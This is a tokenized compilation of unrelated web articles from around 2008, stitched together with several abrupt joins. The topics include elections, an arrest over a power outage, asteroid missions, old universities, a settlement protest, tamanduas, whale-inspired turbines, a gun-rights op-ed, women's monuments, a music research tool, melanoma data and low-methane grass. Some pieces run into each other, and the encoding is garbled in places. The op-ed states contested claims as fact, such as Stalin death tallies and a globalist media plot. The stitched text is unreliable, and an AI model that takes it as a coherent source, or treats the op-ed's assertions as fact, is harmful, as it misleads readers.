And since presidential elections are decided state - by - state – that is , 30 % of Alabama voters might rally to Bush and McCain , but only 3 % of Michigan voters might , and voters in Oregon might on the whole turn against the Republicans – it is by extension not far - fetched that a second attack might not change the electoral map that dramatically .
The media always believe that things will happen in conformation with the patterns of the past .
But if that were true , Barack Hussein Obama would not be the Democratic nominee .
For that matter John McCain would n't be representing the GOP .
Life changes .
And usually before the narrative does .

Race in the Race Blue - Collar Distrust of Obama in the Rust Belt
From the start , Democratic presidential candidate Barack Obama wanted to avoid the subject of race .
But it has caught up with him -- and may make the looming Pennsylvania primary more difficult than he had hoped .
A 27 - year - old Avondale man has been arrested on suspicion of causing a massive power outage last summer in Goodyear 's Estrella community .
The outage knocked out power to nearly 4,000 homes for 19 hours June 18 , 2007 , when Goodyear 's high reached 115 degrees .
David Limas was arrested July 7 in Avondale at a house on Locus Lane , just east of Central Avenue .
Police said they delayed announcing the arrest to allow for additional investigation .
The said they think the suspect acted alone .
According to police , officers arrested the suspect on a tip from the public .
He reportedly told investigators he cut down the pole because he enjoyed the sparks it made .
Police said Limas was on probation in connection with a May 2006 burglary and copper theft arrest at the time of the outage .
He faces one felony count each of arson and aggravated criminal damage .
What would happen if we spot a Near - Earth Asteroid ( NEO ) heading straight for us ?
Assuming we had enough time , we might be able to pull together a group of brave astronauts ( or oil drillers ) and send them to the asteroid just in the nick of time to destroy it … oh hold on , that sounds like the storyline for a Hollywood blockbuster .
Actually , NASA is planning a mission to an NEO , but not because it ’s aimed at us .
An asteroid named 2000SG344 ( which threatened the Earth in the year 2000 ) is being considered as the destination for the first manned asteroid mission .
The asteroid astronauts will travel there , chasing the 28,000 mi/hr ( 45,000 km / hr ) speeding body and then carry out experiments , living on it for up to two weeks .
Why ?
To briefly establish a manned outpost , advancing science and technology toward the ultimate goal : Mars .
The 1.1 million tonne asteroid was once thought to be a serious threat Earth .
Back in 2000 , there was a significant chance that asteroid 2000SG344 may have been on a collision course for Earth ( with an explosive power of approximately 1 megatonne ) .
Obviously it was n’t , but it is expected to make an astronomically close flyby in 2030 .
Before then , NASA hopes to use this 40 meter - wide asteroid as the destination of a three to six month manned mission .
The asteroid mission would act as a “ stepping stone ” for future planetary missions to Mars and beyond .
This three - month trek would provide vital technological , psychological and practical clues to what a manned deep space mission would face .
Landing on an asteroid will be very difficult ( due to the tiny influence of gravity on such a low - mass body ) , but it would provide an opportunity for astronauts to mine for water ice , use it for consumption and convert it into its component hydrogen and oxygen ( for fuel and breathing ) .
These tests would be essential before sending man on a long - term mission to Mars .
Under the current US administration , NASA has been instructed to send man back to the Moon by 2020 .
It is hoped that a more permanent base will be established soon after .
Once the Moon base has been established , missions to Mars will become much easier to carry out .
However , manned trips to near - Earth asteroids allow us to learn more about this potentially catastrophic hazard as well as developing deep space technology for the human presence on Mars .
In a study to be published in June , scientists at NASA ’s Johnson Space Centre in Houston and Ames Research Centre in California will provide a rundown of their plans to use the future Orion spacecraft for this task , with a stop over of one - or two - weeks .
I ’m looking forward to seeing their recommendations for this ambitious development …

My alma mater , Iowa State University , was founded in 1858 ... so that puts it waaaay out of the running for this list .
In fact , all U.S. universities are nowhere near the top 10 ( I know , go figure ) .
The 10 Oldest , Still - Functioning Universities in the World
1. Ahvaz Jundishapur University of Medical Sciences - Khozettan , Iran .
It was founded around 200 B.C. by Shapur I , the Sassanian king .
2. The University of Al - Karaouine - Fes , Morocco .
Founded in 859 , the Guinness Book of World Records has recognized it as the world 's oldest continuously operating , degree - granting university .
( The Ahvaz Jundishapur University has not been continuously - operating )
3. Al - azhar University - Cairo , Egypt .
It opened its doors in 975 .
4. University of Bologna , Bologna , Italy .
The first university in the western world was founded in 1088 .
5 . The University of Paris - Paris , France .
An exact date is uncertain , but it was sometime around 1150 .
Teaching was suspended in 1229 and the university split into 13 different universities in 1970 .
6. University of Oxford " “ Oxford , England .
An exact date the actual university was founded is unknown , but it is known that teaching has existed since 1096 .
Oxford is the oldest university in the English - speaking world .
7. University of Modena and Reggio Emilia " “ Modena , Italy .
It was founded in 1175 but has faded in and out " “ in 1338 the medieval university was replaced by three " public lectureships " but no degrees were awarded .
The university was reestablished in the early 1680s .
8. University of Cambridge " “ Cambridge , England .
It is , as you might suspect , the second - oldest university in the English - speaking world .
It was founded in 1209 .
9. University of Salamanca " “ Salamanca , Spain .
Founded in 1218 , this is actually the second - oldest university in Spain .
The oldest , Palencia , is no longer in existence .
When Christopher Columbus was trying to gain Royal support for finding a western route to the Indies , he presented his case to geographers at this very university .
10 . University of Montpellier " “ Montpellier , France .
It 's been around since 1220 but closed in 1793 because of the French Revolution .
It opened again under the Imperial University of France in 1808 .
In case you 're curious , the oldest college in the U.S. is much debated , depending on your definitions .
The College of William & Mary claims to be the first college to become a university .
Harvard says it is the " oldest institution of higher education in the United States " .
Johns Hopkins says it's the " first research university in the United States " .
The University of Pennsylvania claims that they are " America 's First University " and Georgetown says that Jesuit teaching began in 1634 , which would make it the oldest .
The formal campus was n't built until 1788 , however .

Protesters Call For Boycott of Lev Leviev ’s Conflict Diamonds
OVER 100 WELL - DRESSED , well - heeled New Yorkers attending the invitation - only opening of diamond mogul Lev Leviev ’s Madison Avenue jewelry store on Nov. 20 appeared stunned and aghast to find their evening derailed by a noisy protest against Leviev ’s construction of illegal West Bank settlements .
Gala attendees set down their champagne glasses and gathered by windows to view the signs and Palestinian flags , and hear protesters ’ chants .
Thirty New York City human rights activists chanted , “ You ’re glitz , you ’re glam , you ’re building on stolen land , ” and “ All your diamonds cannot hide , your support for Apartheid . ”
Protesters called on New York City ’s upscale residents to boycott Leviev ’s diamonds .
Disconcerted attendees hastily exited to their limousines to loud chants of , “ Occupation is a drag , just say no to your gift bag . ”
Lev Leviev is one of Israel ’s richest men .
He built his enormous fortune trading in diamonds with apartheid - era South Africa .
His company now buys diamonds from the repressive Angolan government .
Leviev uses profits from diamond sales to fuel the conflict in Palestine and Israel by funding the construction of illegal Israeli settlements in the West Bank , undermining the prospects for Middle East peace .
Leviev ’s diamonds are “ conflict diamonds ” in a broad sense of the term , funding repression in Angola and violations of international law in Palestine .
Leviev ’s real estate empire in Israel is building homes for Israelis only in the West Bank settlements of Mattityahu East and Zufim , according to Gadi Algazi in the August 2006 Le Monde diplomatique , and in Ma’ale Adumim and Har Homa , according to The Jerusalem Post .
He has also built homes in the settlement of Ariel .
All the settlements in which Leviev has built homes seize vital Palestinian water and agricultural resources and carve the West Bank into disconnected bantustans , destroying hopes for a viable Palestinian state .
All Israeli settlements built in the occupied Palestinian territories violate international law .
The Israeli newspaper Yediot Ahronot also reported on Jan. 28 , 2004 that Leviev is a primary donor to the Israeli organization the Land Redemption Fund , which allegedly uses fraud and intimidation to extort land from Palestinian farmers for Israeli settlement .
Leveiv and his former partner Shaya Boymelgreen are building the settlement of Mattityahu East on the village of Bil ’in ’s land .
Bil ’in has earned international acclaim for its three - year campaign of nonviolent protest against the construction of settlements and Israel ’s wall on their farmland .
“ Leviev ’s new Manhattan store hides the devastating use of its owner ’s fortune underneath shimmering facets of polished diamonds , ” said Daniel Lang - Levitsky of Jews Against the Occupation / NYC .
Adalah - NY held other protests at Leviev ’s 700 Madison Ave. jewelry store , including one on Nov. 20 and another on Dec. 8 , described as “ Dabke vs. Diamonds , ” a dance against the destruction of communities by Israeli diamond mogul Lev Leviev .

We 've got some news that 'll make a PC gamer or two weep : the Wall St. Journal is reporting that as of next month Dell will be dropping four models of XPS performance PCs to focus solely on pushing Alienware .
Certainly no surprise though , we 've been waiting for this move since they picked the company up back in 2006 .
Of course , there will be certain challenges , namely how Dell will keep its Alienware brand separate ( read : pristine ) -- as its done since the acquisition -- yet be able to offer performance PCs on its site alongside the rest of its machines .

The coolest dude among all animals , and then some .
Tamandua ( Tamandua tetradactyla ) is a smaller species of anteaters , but some would say they are the " perfect " anteaters - just the right size , and just the right amount of attitude .
They are most closely related to sloths and armadillos , but seeing these pictures will make you wonder if you are n't related to them by any chance .
It seems they know how special they look , and do n't mind posing in sweaters and other handmade clothes .

TamanduaGirl ( see Anteater Entertainment ) keeps two South American anteaters - tamanduas Pua and Stewie - in her house .
See the photo chronicle of their life in this set and videos on this page .
Waking up and " yawning " shows the true length of their tongue :
The owner says : " Tamanduas are very smart .
They know how to open the fridge , open the doors ... "
" ... they know how to open the window , open drawers , open cabinets , open containers , climb the door frame , and respond to their name . "
" The dogs are scared of their long tails ; and some tamanduas may use their long claws on almost anything , including your furniture .
They like to tear things up when given the chance like coconuts and logs " .
To avoid puncturing their palms with their sharp claws , they walk on the outsides of their hands .
They can wave their arms at you , and almost say " hello " -
Do your homework and be prepared to put with many surprises , if you consider an anteater as a pet .
First of all , they do n't come cheap ( up to $ 4,500 ) - and they need a special diet ( unless you have an endless supply of ants , but even then , they need a supplement )
Tamanduas are very loving , but just like cats , they tend to " let you " love them .
However , when they do hug you , it 's impossibly cute :
Some clothes seem to be a perfect fit for tamandua :
Traveling in a car does not seem to faze them , only pique their curiosity :
And then , there is love and romance :
Soon this anteater couple will star in the upcoming " Dr. Dolittle 4 " movie .
That is if they will get from under their cozy blankets in the morning :
They seem to be well aware of their awesomeness :
" OK , ok , no applause is needed " -

A West Chester University professor has developed a new wind turbine that draws inspiration from a blubbery source : the flippers of a humpback whale .
Those knobby flippers were long considered one of the oddities of the sea , found on no other earthly creature .
But after years of study , starting with a whale that washed up on a New Jersey beach , Frank Fish thinks he knows their secret .
The bumps cause water to flow over the flippers more smoothly , giving the giant mammal the ability to swim tight circles around its prey .
What works in the ocean seems to work in air .
Already a flipperlike prototype is generating energy on Canada 's Prince Edward Island , with twin , bumpy - edged blades knifing through the air .
And this summer , an industrial fan company plans to roll out its own whale - inspired model - moving the same amount of air with half the usual number of blades and thus a smaller , energy - saving motor .
Some scientists were sceptical at first , but the concept now has gotten support from independent researchers , most recently some Harvard engineers who wrote up their findings in the respected journal Physical Review Letters .
" There 's definitely something going on with these bumps , " said Ernst A van Nierop , the paper 's lead author .
The saga starts with Fish , a tae kwon do black belt who breaks boards to demonstrate muscle control to his anatomy students .
Fish is a sort of modern - day cousin of the Wright brothers , in that he seeks inspiration from the animal kingdom .
He 's a professor of biology at West Chester , sharing his office with a small alligator named Wally , but a more specific term for him is functional morphologist .
Why are animals built the way they are ?
Which features - limbs , tails , noses - give them an edge in propulsion , conserving energy , avoiding predators ?
Fish 's research is born of pure scientific curiosity , his interest ranging from muskrats to alligators .
But many want to use his insights for human technology , convinced that we can learn a few tricks from what nature has evolved over millions of years .
So now he is working with the military to develop submarine robots inspired by manta rays .
And he 's studying the nasal cavity of the shark , which might lead to developing an artificial nose .
The first of these animal - inspired ideas to reach fruition is the whale - flipper wind turbine .
Fish was visiting Boston about 25 years ago when he and his wife wandered into a gallery that featured sculptures of animals .
One was a small rendition of a humpback whale .
Fish had n't worked much with marine creatures at the time , but he was pretty sure the sculptor had made a mistake .
There were bumps on the front edge of the mammal 's flippers .
Fish was sure they belonged on the rear edge .
The gallery owner overheard him making a derisive remark , and brought over a brochure with a photograph of the humpback .
Indeed , the bumps were on the front .
" It just drove me insane , " recalls Fish , now 55 .
" Because why should that be ? "
Determined to find out , he put in a request for a flipper specimen
from the Smithsonian Institution .
Museum officials finally called years later , around 1990 , to tell him a dead humpback had washed ashore in New Jersey .
He was welcome to come get a flipper at the Marine Mammal Stranding Center in Brigantine , but he had to cut it off .
He was told the whale was about 20 feet long .
Knowing that a humpback 's flippers are about one - third of its body length , Fish estimated that one of the flippers would measure 6 feet .
A tight fit for his Mercury Lynx hatchback , but he could manage .
Then he got there and found the whale was closer to 30 feet , the flipper 10 feet .
He had brought his Black & Decker crosscut saw with him , but it took hours to cut the flipper into three sections .
Each piece weighed more than 100 pounds , and he watched his rear bumper sag more and more as he placed each piece in the trunk .
" I drove back in absolute fear that a New Jersey state trooper would stop me , having rotting body parts in black plastic bags , " he says .
The pieces spent two years in the freezer .
Fish could n't get anyone to make a cast of the giant frozen pieces , so he could n't make a model to study it .
Eventually , he and colleague Jan Battle cut the pieces into 1 - inch sections - failing with a series of smaller saws until they used a butcher - quality model at the University of Pennsylvania 's veterinary pathology lab .
As they had expected , they found the flipper 's cross-section looked rather like that of a wing .
But what were the bumps for ?
One of the ways an airplane pilot generates lift is by increasing the wings ' angle of attack .
The front edge of the wing is tilted upward , deflecting the oncoming wind so that the wing rises .
The phenomenon is the same as when you stick your hand out the window of a speeding car .
But if the angle is increased too much , the air rushing over the top of the wing becomes turbulent , tumbling over itself in undesirable eddies .
The wing will stall .
Yet when models of the bumpy flippers were tested in a wind tunnel , Fish and his colleagues found something interesting .
The flippers could be tilted at a higher angle before stall occurred .
The scientific literature had scant reference to the flipper bumps , called tubercles .
Fish reasoned that because the whale 's flippers remained effective at a high angle , the mammal was therefore able to manoeuvre in tight circles .
In fact , this is how it traps its prey , surrounding smaller fish in a " net " of bubbles that they are unwilling to cross .
In 2004 , along with engineers from the US Naval Academy and Duke University , Fish published hard data :
Whereas a smooth - edged flipper stalled at less than 12 degrees , the bumpy , " scalloped " version did not stall until it was tilted more than 16 degrees - an increase of nearly 40 percent .
Fish then partnered with Canadian entrepreneur Stephen Dewar to start WhalePower , a Toronto - based company that licenses the technology to manufacturers .
They have since made airfoils that can be tilted even more before stalling , up to 30 degrees - though in the real world they would n't go that high , in part because of an unwelcome increase in the resistant force known as drag .
Exactly why the tubercles work is not fully understood ; there may be more than one reason .
Those who 've studied the bumps agree that somehow they delay " separation " - the fateful turbulence that is associated with stall .
A key seems to be the difference in pressure between the air rushing over the tubercles and the air channelled through the " troughs " in between .
Last summer , a traditional wind turbine was modified with bumpy blades and is being tested by the Wind Energy Institute of Canada .
And Envira - North Systems , a maker of industrial fans in Seaforth , Ontario , plans to have a bumpy - bladed model on the market by the end of the summer .
" I was a sceptic at the beginning , " said Stephan Gingras , the fan company 's research and development manager .
" I 'm not a sceptic anymore . "
It has all been a bit of a culture shock for Fish , who is more at home in the open world of academia than the more secretive realm of inventions and patents .
Two decades ago , his only motivation was to figure out what the bumps were for .
" I sort of found something that 's in plain sight , " he says .
" You can look at something again and again , and then you 're seeing it differently . "
A professor of planetary science says humans could be living on Mars within 25 years .
Professor Jeff Taylor from Hawaii's Institute of Geophysics and Planetology is addressing a conference in Perth today .
He says humans could be living on the moon within 15 years , and if basic life supports like oxygen and water can be secured , humans could colonise Mars within 25 years .
Professor Taylor says it is human nature to want to explore and colonise new areas and humans may go to Mars for economic reasons , or to secure additional energy supplies .
He says once people start living on the moon , new businesses will be established .
" Whether that 's going to be servicing and building telescopes or servicing satellites in orbit around the Earth , including communication satellites deep in synchronous orbits , or any other commercial ventures including space tourism , " he said .
Professor Taylor says the first step would be to secure basic life supports on the planet .
" There is plenty of water which you not only use for drinking , but you can split it into oxygen and hydrogen and use it for life support , " he said .
" You can also make fuel from it .
Mars is really quite rich in those sorts of resources . "

" The right of the citizens to keep and bear arms has justly been considered , as the palladium of the liberties of a republic ; since it offers a strong moral check against the usurpation and arbitrary power of rulers . "
– Justice Story
It really bugs the gun-grabbers that the Supremes did not completely scratch out the Second Amendment last week , although they made a small first step in that direction .
For instance , so steamed are they over at the Chicago Tribune they are calling for the Second Amendment to be repealed .
As usual , they predicate their argument on three words — “ well regulated Militia ” — and claim beyond this you and I have no right to own firearms .
“ The amendment was intended to protect the authority of the states to organize militias .
The inartful wording has left the amendment open to public debate for more than 200 years , ” the Tribune claims .
There is absolutely no evidence this is what the founders intended and the editors of the Chicago Tribune would be hard - pressed to find a single word in the writings of the founders indicating they believed only militias had the right to bear arms .
In fact , the gun-grabbers completely misunderstand the very meaning of the word as the framers used it — for the founders , a militia was not like the National Guard , but rather a body of armed citizens .
The militia clause and the right to arms are intended to be complementary .
As Thomas Jefferson knew , “ modern regular armies ” consist of “ desperate characters , ” thus demonstrating “ the necessity of obliging every citizen to be a soldier ; this was the case with the Greeks and Romans and must be that of every free State .
Where there is no oppression there can be no pauper hirelings . ”
Justice Story , appointed to the Supreme Court as an Associate Justice by James Madison in 1811 , wrote in 1833 :
The militia is the natural defense of a free country against sudden foreign invasions , domestic insurrections , and domestic usurpations of power by rulers .
It is against sound policy for a free people to keep up large military establishments and standing armies in time of peace , both from the enormous expenses , with which they are attended , and the facile means , which they afford to ambitious and unprincipled rulers , to subvert the government , or trample upon the rights of the people .
The right of the citizens to keep and bear arms has justly been considered , as the palladium of the liberties of a republic ; since it offers a strong moral check against the usurpation and arbitrary power of rulers ; and will generally , even if these are successful in the first instance , enable the people to resist and triumph over them .
In New Orleans after Katrina , the state went house to house grabbing guns , not because they were concerned about Old West shoot - outs in the street but because they did not want citizens challenging the “ arbitrary power of rulers . ”
As Alexander Hamilton noted , in times of chaos and the breakdown of civility — as in the case of Katrina — the “ citizens must rush tumultuously to arms , without concert , without system , without resource , ” that is without the intervention of the state , because the “ people , without exaggeration , may be said to be entirely the masters of their own fate . ”
As the founders knew , and the Chicago Tribune is unable or unwilling to admit , the “ militia , ” that is to say an armed citizenry , is the ultimate check against a state or the national government .
In fact , as Jefferson stated , it is the “ right and duty ” of citizens “ to be at all times armed ” as a deterrent to tyranny .
However , since Jefferson ’s time , the very concept of such a duty has all but disappeared and has been replaced by a mass psychosis in dreadful fear of the very existence of weapons .
Millions of Americans expect the government to protect them , a mindset diametrically opposed to the thinking of Jefferson and the founders who knew all too well that government will become murderously tyrannical if not checked .
It should come as no surprise the corporate media is engaged in a propaganda campaign to convince you that the Second Amendment should be repealed .
After all , we no longer have small , independent newspapers published by people who understand the Constitution and the Bill of Rights , but rather huge corporate combines owned by the very same globalist interests that have hijacked the government .
It will be impossible for them to impose their transnational corporate plan — in other words , fascist plan , as Mussolini understood that corporatism and fascism are inseparable — on the whole of humanity so long as an appreciable minority remain armed .
That ’s what the corporate media jihad against the Constitution is all about — convincing you that “ gun crime ” is out of control , people who own guns are redneck nut cases , guns are for hunting only , the Second Amendment is a myth ( or at best an editorial mistake ) , and it is in our best interest to relinquish responsibility for our own protection , our duty , and embrace government .
Finally , keep in mind the Soviet dictator Joseph Stalin was a big advocate of gun control .
In 1929 , the Soviet Union established gun control and from 1929 to 1953 about 20 million dissidents , unable to defend themselves , were rounded up and exterminated .
By 1987 that figure had risen to 61,911,000 .
“ There is no doubt in my mind that millions of lives could have been saved if the people were not ‘ brainwashed ’ about gun ownership and had been well armed , ” writes Theodore Haas , a survivor of Dachau .
“ Hitler ’s thugs and goons were not very brave when confronted by a gun . ”
Our thugs are not very brave , either .
But they do n’t need to be when confronted with a brainwashed and increasingly disarmed public .

Ever hear that women are the fairer or weaker sex ?
While not every woman ( and not every man for that matter ) can lift over a hundred pounds many historical women have been as strong ( or even far stronger ) than their male counterparts in other critical ways and at crucial times .
From martyr French heroin Joan of Arc who fought against the British for the country ’s territories to those that played a key role during the World Wars , women have demonstrated time and time again that they are not inferior to men .
From around the world here are some of the most interesting monuments dedicated to amazing women of history – as well as one quite different memorial to Amsterdam ’s “ working girls . ”
In Zalongo , northwestern part of Greece , lies a grandiose monument dedicated to the Women of Kassope .
Representing the “ dance of Zalogos ” it was created by sculptor Zogolopoulos right above the hill , on the rocks where the Souliot women and their children committed suicide , not letting the men of the Turk Ali Pasha to catch them .
Souli was one of the four small villages in Thesprotia , a prefecture of Greece , who decided to live in the mountains and free from the Ottoman Yoke .
Located on the Parliament Hill in Ottawa , Canada , The Famous Five or The Valiant Five statues were built in the memory of Emily Murphy , Irene Marryat Parlby , Nellie Mooney McClung , Louise Crummy McKinney and Henrietta Muir Edwards .
The five women from Alberta became famous for asking the Supreme Court of Canada if “ the word ‘ Persons ’ in section 24 of the British North America Act , 1867 , include female persons ? ”
It was them who to started the women ’s rights movement in Canada in 1920s , because at that time women were n’t allowed to vote .
The longest reigning monarch in the UK history , Queen Victoria , is the person who officially chose Ottawa as Canada ’s capital on December 31 , 1857 .
The monument was sculpted 40 years later by Louis - Philippe HÃƒÂ©bert , from Quebec and unveiled during a lavish celebration of the Queen ’s Diamond Jubilee at the sixtieth year of her reign .
Though there is n’t any definitive historical evidence , old folk tales say that the Queen used her hatpin to choose Ottawa , somewhere between Toronto and Montreal while other say that she just liked the watercolors near the city .
The Unknown Woman Worker monument is located in Belfast , UK , outside the Europa Buscentre and is dedicated to all women who work .
It ’s the city ’s small tribute to those who worked hard to build the largest and most famous linen industry in the world .
The two women statues are standing directly on the sidewalk and have a lot of utensils attached to them , representing the various activities women have or had .
A shopping basket , clothe pegs instead of fingers , a telephone , or hairbrushes instead of hair to name a few things .
Joan of Arc ( Jeanne d’Arc ) is an emblematic figure in French history .
She was also called the “ Maid of Orleans ” because during the 15th century , claiming divine guidance she led the French armies against the British in the Hundreds Years ’
War lifting the siege over the Orleans city .
She was only 19 years old when captured and found guilty of herresy .
She was burned at the stake .
24 years later the Holy See found her innocent and Joan of Arc was declared a martyr , beatified in 1909 and canonized in 1920 .
Located in Place des Pyramides in Paris , the magnificent statue with the most famous medieval French heroine riding a golden horse was made by Daniel FrÃƒÂ©miet in 1874 and was dedicated to the country ’s only female Saint .
The National Women ’s Monument or the Vrouemonument from Bloemfontein , South Africa is dedicated to those more than 27,000 martyr women who died during the Boer War , in the British concentration camps .
It consists of a 115 feet tall obelisk and two bas - relief panels depicting women being herded into a concentration camp clutching their few paltry possessions and a weakened child dying while a woman kneels at his bedside .
The Rosenstrasse monument is located in a park in the old Jewish quarter of Berlin and consists of a group of sculptures commemorating the German women ’s who successfully freed their husbands through non-violent protests .
More than 1,700 Jewish men haven been rescued after being held by the Gestapo to be deported .
The monument is work of German sculptor , Ingeborg Hunzinger , who did it in mid-80s and named it Block der Frauen ( Block of Women ) .
In 1995 it was brought to the park .
Dulcinea , which in Spanish refers to an overly elegant sweetness , is a simple woman from the village of La Mancha in Toboso .
She ’s only a fictional character in Cervantes ’ novel , with whom Don Quixote madly falls in love without even seeing her .
She was the most beautiful woman on Earth to him but just a figment of his imagination .
The monument dedicated to Dulcinea is Located in Madrid , Spain , and was erected in 1957 by Spanish sculptor , Federico Coullaut - Valera Mendigutia .
Sybil Ludington , the daughter of a New York militia officer , was with her family on the night of April 26 , 1777 , when word reached her house that the British were burning the town of Danbury , Connecticut where munitions and supplies for the entire region were stored .
With permission from her father , Sybil leapt on her horse and rode more then 40 miles to summon volunteer militia to repel the British raid .
Sybil Ludington is a true American Hero and the statue erected in 1961 on Route 52 beside Gleneida Lake in Carmel , New York , was built in her memory .
Molly Pitcher is the nickname of a legendary heroine during the American Revolution War .
Her real name was Mary Ludwig Hays and she had the task of carrying water to the men on the battlefield to swab their cannons ( no , that is n’t a euphemism ! ) .
According to a story , in 1777 during the Battle of Monmouth , Mary had to take over the cannon firing after her husband fell wounded and she managed her task with bravery and courage .
The Old Carlise Cemetery in Carlisle , Pennsylvania , is now guarded by her statue .
Located on Madison Avenue near the New York State Museum , the New York State Women Veterans Memorial honors all those women that served the military service for the last 200 years .
Created by Glenmont artisan Hy Rosen , the 8 foot high monument symbolizes strength and commitment of women in defending the United States and its principles .
Of course , the list would n’t be complete without the Red Light District Statue in Amsterdam .
Former prostitute , Mariska Majoor , got the idea to build a statue to all the famous “ working ” girls in the world , especially those from Amsterdam .
The bronze monument was named “ Belle ” and is located close to the Prostitution Information Center and right in the front of the city ’s oldest church .
Ironic is n’t it ?
A German supermarket is encouraging customers to scan and ring up their shopping using mobile phones , and check out without the help of a cashier .
It is one of the number of innovations at the new " Future Store " - as Steve Rosenberg discovered when he went along to do his weekly shopping .

Happy Songsmith’ing !
Like to Write Music ?
Most folks never get a chance to answer this question , since writing music takes years of experience … if you do n’t play an instrument or spend lots of time around music , you ’ll probably never get to write a song .
MySong , introduced in our CHI 2008 paper , automatically chooses chords to accompany a vocal melody , allowing a user with no musical training to rapidly create accompanied music .
MySong is a creative tool for folks who like to sing but would never get a chance to experiment with creating real original music .
Come on , you know who you are … you sing in the car , or in the shower , or you go to karaoke clubs , or you just once in a while find yourself singing along with catchy commercial jingles .
MySong is also a great tool for songwriters who want to quickly experiment with melodies and accompaniments .
Our CHI 2008 paper : [ pdf ]
Our AAAI 2008 paper : [ pdf ]
Our CHI 2008 paper discusses the system at a high level and presents an evaluation of the system ; our AAAI paper focuses on ( a ) a formal , mathematical description of our chord - generation and pitch - tracking systems and ( b ) additional mechanisms we use to intuitively expose model parameters to users .

What MySong is n’t
And just a quick word on what MySong is n’t , particularly in response to the various forum posters who are ( appropriately ) very suspicious of anyone who thinks songwriting can be automated .
MySong does not automate songwriting .
No one will ever write , record , and produce a top - 40 hit with any version of MySong .
What MySong does do is give many folks who would never even tastesongwriting a great opportunity to just get a glimpse of music creation .
Is the output from MySong ready for radio ?
No .
But is it more than good enough , when coupled with a style - based arrangement tool ( i.e. when not using just the simple piano part you hear in our video ) to give someone a feeling that they ’ve created something musical for the first time ?
Absolutely .
Is it more than good enough to make a cute birthday song for Mom or a Valentine ’s Day song for your significant other , even if you do n’t play an instrument ?
Absolutely .
Furthermore , for songwriters , is MySong going to replace the craft of songwriting ?
Never .
Could it be a super - useful scratchpad for exploring new melodies and ideas ?
Definitely .
If you ’re a songwriter , you ’ve probably had the experience of coming up with a melody and finding the nearest object with a “ record ” button on it just to get your idea down .
Imagine that first quick experience also letting you explore some chords and styles … lots of songwriters have told us they ’d love to have that !
Then of course you ’d work with other tools , other people , instruments , etc. to really develop a song , but this could be a great tool that lets you play with new melodies in places where you could n’t before ( on the go , on the bus , in the airport , etc. ) .
Sample output
Now before we get to all the detailed examples and results , let ’s finally hit you with a typical audio example of something created with MySong .
Here a singer just sang into MySong , twiddled some sliders , and pressed “ play ” ; we also show you the results we get when we take our chords and fire them through Band - in - a - Box , a style - based arrangement tool that takes chords as input .

Table 1 : Accompaniments Created by Non-Musically - Trained Study Participants
As part of the evaluation presented in our CHI 2008 paper , we had 13 non-musically - trained participants come into our lab to try out MySong .
They got a 5 - minute tutorial on the system , then had 10 minutes per song to play with it .
Since we figured participants would be sufficiently uncomfortable singing in a stranger ’s office , we did n’t ask people to work with new melodies ; instead , we had them bring in a few of their favorite pop songs .
However , we stress that from MySong ’s perspective , these were completely new songs .
In the following table , the files linked in the first column of audio contain melodies performed by participants in our evaluation .
The files linked in the second column of audio contain accompanied versions of those melodies , created with MySong ’s chord - generation algorithm and MySong ’s simple piano pattern .
The files linked in the third column of audio contain the same chords — generated with MySong — fed through Band - in - a- Box , a commercial software package that assembles pre-recorded sequences of instrmental “ styles ’ to generate audio for a set of chords .
MySong is able to automated Band - in - a- Box for final audio rendering .
We show this to give you a complete picture of what users can create with MySong .
These accompaniments were created using MySong in less than ten minutes by participants who had absolutely no familiarity with chords or harmony .
All participants featured on this page consented to the release of these recordings .

Table 2 : Accompaniments Prepared for Our Comparative - Rating Study
In the following table , we present examples from the comparative - rating study described in our paper .
Here we had experts create accompaniments — in five minutes or less — for a large number of melodies , using ( a ) MySong , ( b ) whatever tools a musician would normally use to accompany a melody ( instruments ) , and ( c ) a commercial sytem that creates accompaniments for instrumental ( not vocal ) melodies ( to show the value of our vocal - specific innovations ) .
The songs we present here were selected solely based on copyright permissions and not on the quality of the generated accompaniments .
Each selection is presented as an isolated vocal recording in left - most column .
The next three columns present , for each melody , the vocal audio along with accompaniments prepared using three systems for selecting chords : ( 1 ) MySong ( the system presented in our paper ) ( 2 ) manual assignment by musicians , and ( 3 ) Band - in - a - Box1 ( a state - of - the - art system for accompanying instrumental melodies ) .
Note that these systems were used only for selecting chords ; the selected chords were rendered to piano accompaniments using an identical system for each condition .
The number below each icon is the mean of the subjective scores assigned to the corresponding accompaniment .
Scores were assigned independently by 30 musicians .
Song Input MySong

1 Band - in - a- Box ( BIAB ) is , to our knowledge , the only commercially - available system for generating chord sequences from melodies .
BIAB is primarily a system for generating accompaniment audio from chords , but includes a module for determining chords from a melody .
The BIAB system represents the state of the art in determining chords from a musical melody , but was not designed for vocal input , which cannot yet be reliably and automatically converted to a “ clean ” musical melody .
We therefore are not evaluating the quality of BIAB ’s chord selection mechanism per se ; rather , we use this comparison to highlight the importance of designing a chord - selection system specifically for vocal audio .
In fact , BIAB does a great job generating chords for instrumental melodies .
Our evaluation should thus not be used to judge the quality of this component of BIAB .
BETHESDA , Md. , July 10 ( UPI ) --
Cases of the deadliest form of skin cancer are increasing among young U.S. women but not men , a dermatology study published Thursday said .
The annual incidence of melanoma among white women age 15 to 39 jumped 50 percent from 1980 - 2004 but remained steady for white men in that age bracket during the same period , the study published in the Journal of Investigative Dermatology said .

Melanoma is a rare type of skin cancer but causes 75 percent of all skin cancer - related deaths , the most of any type of skin cancer .
It is most common among Caucasians living in sunny climates .
The incidence of melanoma among the young women in the study rose to 13.9 cases per 100,000 women from 9.4 cases , said the study , which used data from the National Cancer Institute , part of the U.S. government 's National Institutes of Health .
The reason for the increase among young women is unclear , the study said .
The researchers recommended additional studies to investigate if changes among young women 's recreational sun exposure or increased tanning bed use were responsible .
Grass that may help tackle global warming by cutting the level of methane given off by cows is being developed by scientists reports the latest issue of the Society of Chemical Industry ’s ( SCI ) magazine Chemistry & Industry .
Scientists at Gramina , a joint biotech venture by Australia ’s Molecular Plant Breeding Cooperative Research Centre and New Zealand rural services group PGG Wrightson Genomics , are developing a grass that will not only cut the amount of methane cows burp up when chewing the cud but also grow in hotter climes .
This means that farmers should be able to maintain dairy herds ’ productivity and profitability in the face of a changing climate , while cutting down their gaseous burps and reducing their contribution to global warming .
Combating greenhouse gas emissions produced by the agricultural industry is a priority .
The UK ’s DEFRA has just announced a roadmap aimed at helping the dairy industry reduce its potential impact on the environment in line with Britain ’s target to cut its greenhouse emissions by 20 % by 2010 .
By 2015 the roadmap plans to have 20 - 30 % of milk producers trialling new technology to cut greenhouse gas emissions .
